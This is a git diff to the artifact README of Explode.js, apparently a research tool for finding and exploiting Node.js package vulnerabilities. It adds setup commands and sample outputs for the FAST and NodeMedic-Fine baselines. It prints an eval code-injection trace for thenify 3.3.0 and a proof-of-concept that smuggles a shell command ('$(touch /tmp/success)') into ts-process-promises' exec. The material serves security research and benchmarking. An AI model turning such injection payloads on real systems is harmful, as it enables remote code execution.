@@ -14,7 +14,7 @@ This section contains an introduction to the Explode.js tool, requirements, and 
 ## A.1. Description & Requirements
 
 **How to access.**
-The artifact is available as a persistent DOI at 10.5281/zenodo.15009157.
+The artifact is available as a persistent DOI at [10.5281/zenodo.15009157](10.5281/zenodo.15009157).
 
 **Dependencies.**
 The evaluation of this artifact does not depend on specific hardware.
@@ -88,67 +88,165 @@ The generated exploit can be found in the file `[FIXME]`.
 
 <br>
 
-## A.3. Getting Started with FAST
+## A.3. Getting Started with *FAST*
 
 **Setup.** 
-To setup the environment, load the FAST Docker image `[FIXME]`, with the following command:
+To setup the environment, one can load the FAST Docker image `fast_image.tar.gz`, with the following command:
 
 ```sh
-[FIXME]
+$ docker load --input fast_image.tar.gz
+```
+
+Then, to create and start container from the loaded image one can use:
+```sh
+$ docker run -it -h fast fast
 ```
 
 **Basic Testing.**
-To verify that the image is properly loaded and that the tool is running as expected, run FAST for the [TODO] example using the following command:
+To ensure that the tool is running as expected, one can verify it by running FAST on the `thenify@3.3.0` package with the following command:
 
 ```sh
-[FIXME]
+explodejs@fast~$ cd explode-js && python3 run-fast.py datasets out --packages thenify 
 ```
 
 **Output.** The output of the previous command should be:
 
 ```
-[FIXME]
+[*] 1 package(s) selected for benchmarking
+[-] Running: thenify@3.3.0
+Running: python3 -m simurun -t code_exec -X datasets/vulcan-dataset/CWE-94/GHSA-29xr-v42j-r956/src/index.js
+
+| package  | version | cwe   | marker   | path_time | expl_time | total_time | detection  | exploit  |
+|----------|---------|-------|----------|-----------|-----------|------------|------------|----------|
+| thenify  | 3.3.0   | CWE-94| Exited 0 | 0.385258  | 26.0743   | 26.4596    | successful | failed   |
 ```
+The output table is also saved in `.csv` format as `fast-parsed-results.csv`.
 
 FAST does not generate exploits. 
 Instead, it generates a trace with information regarding the inputs to activate the exploit.
-In this case, FAST generates the trace:
+In this case, FAST generates the trace to stdout. Part of it is given below
 
 ```
-[FIXME]
-```
+Attack Path: 
+==========================
+/home/explodejs/explode-js/datasets/vulcan-dataset/CWE-94/GHSA-29xr-v42j-r956/src/index.js
 
-, from which one can  manually construct the exploit:
+Line 28:
+--------------------------------------------------
+thenify.withCallback = function ($$__fn__$$, options) {
+    assert(typeof $$__fn__$$ === 'function')
+    options = options || {}
+    options.withCallback = true
+    if (options.multiArgs === undefined) options.multiArgs = true
+    return eval(createWrapper($$__fn__$$.name, options))
+}
 
+Line 60:
+--------------------------------------------------
+multiArgs = 'var multiArgs = ' + JSON.stringify(multiArgs) + '\n'
+
+Line 67:
+--------------------------------------------------
+return '(function ' + name + '() {\n'
+    + 'var self = this\n'
+    + 'var len = arguments.length\n'
+    + multiArgs
+    + withCallback
+    + 'var args = new Array(len + 1)\n'
+    + 'for (var i = 0; i < len; ++i) args[i] = arguments[i]\n'
+    + 'var lastIndex = i\n'
+    + 'return new Promise(function (resolve, reject) {\n'
+        + 'args[lastIndex] = createCallback(resolve, reject, multiArgs)\n'
+        + '$$__fn__$$.apply(self, args)\n'
+    + '})\n'
++ '})'
+
+Line 17:
+--------------------------------------------------
+return eval(createWrapper($$__fn__$$.name, options))
 ```
-[FIXME]
+The full trace can be found in the saved stdout file: `out/5_fast/fast-stdout.log`. One can manually construct the exploit for the above example:
+
+```js
+// Line 28: Vulnerable function definition
+thenify.withCallback = function ($$__fn__$$, options) {
+    assert(typeof $$__fn__$$ === 'function');
+    options = options || {};
+    options.withCallback = true;
+    if (options.multiArgs === undefined) options.multiArgs = true;
+    return eval(createWrapper($$__fn__$$.name, options));  // Line 28
+}
+
+// Line 60: Creating the multiArgs string
+multiArgs = 'var multiArgs = ' + JSON.stringify(multiArgs) + '\n';
+
+// Line 67: Creating the wrapper function for the $$__fn__$$
+return '(function ' + name + '() {\n'
+    + 'var self = this\n'
+    + 'var len = arguments.length\n'
+    + multiArgs  // Line 67 (inserting multiArgs)
+    + withCallback
+    + 'var args = new Array(len + 1)\n'
+    + 'for (var i = 0; i < len; ++i) args[i] = arguments[i]\n'
+    + 'var lastIndex = i\n'
+    + 'return new Promise(function (resolve, reject) {\n'
+        + 'args[lastIndex] = createCallback(resolve, reject, multiArgs)\n'
+        + '$$__fn__$$.apply(self, args)\n'
+    + '})\n'
++ '})'
+
+// Line 17: eval function call
+return eval(createWrapper($$__fn__$$.name, options));  // Line 17
 ```
 
 <br>
 
-## A.4. Getting Started with NodeMedic-Fine
+## A.4. Getting Started with *NodeMedic-Fine*
 
 **Setup.** 
-To setup the environment, load the NodeMedic-Fine Docker image `[FIXME]`, with the following command:
+To set up the environment, run the installation script for NodeMedic-Fine benchmarking using the following command:
 
 ```sh
-[FIXME]
+$ ./nodeMedic-bench-install.sh
 ```
 
+This script will build NodeMedic's official Docker image and install two Python modules necessary for generating the output.
+
 **Basic Testing.**
-To verify that the image is properly loaded and that the tool is running as expected, run NodeMedic-Fine for the [TODO] example using the following command:
+To verify that the image is properly loaded and that the tool is running as expected, run NodeMedic for the `ts-process-promises@1.0.2` example using the following command:
 
 ```sh
-[FIXME]
+$ python3 run-NodeMedic.py bench/datasets out --packages ts-process-promises
 ```
 
 **Output.** The output of the previous command should be:
 
 ```
-[FIXME]
+[*] 1 package(s) selected for benchmarking
+[-] Running: ts-process-promises@1.0.2
+Running: docker run -it --rm -v /Users/framos/Desktop/explode-js/out/ts-process-promises@1.0.2__nodeMedic:/nodetaint/analysisArtifacts:rw nodemedic-fine:latest --package=ts-process-promises --version=1.0.2 --mode=full
+
+| package             | version   | cwe    | marker   |   fuzz_time |   expl_time |   total_time | taintpath   | exploit   |
+|:--------------------|:----------|:-------|:---------|------------:|------------:|-------------:|:------------|:----------|
+| ts-process-promises | 1.0.2     | CWE-78 | Exited 0 |      20.097 |      10.628 |      72.4447 | true        | true      |
 ```
 
-The generated exploit can be found in the file `[FIXME]`.
+One of the generated exploits can be found in the file `out/ts-process-promises@1.0.2__nodeMedic/poc0.js`:
+
+```js
+// JALANGI DRIVER
+process.backup_exit = process.exit;
+process.exit = function(){console.log("Tried calling process.exit")};
+    
+var PUT = require('/nodetaint/packageData/ts-process-promises/node_modules/ts-process-promises');
+try {
+	var x0 = " $(touch /tmp/success) # \" || touch /tmp/success # ' || touch /tmp/success";
+var x1 = {};
+new PUT["exec"](x0,x1)();
+} catch (e) {
+	console.log(e);
+}
+```
 
 
 
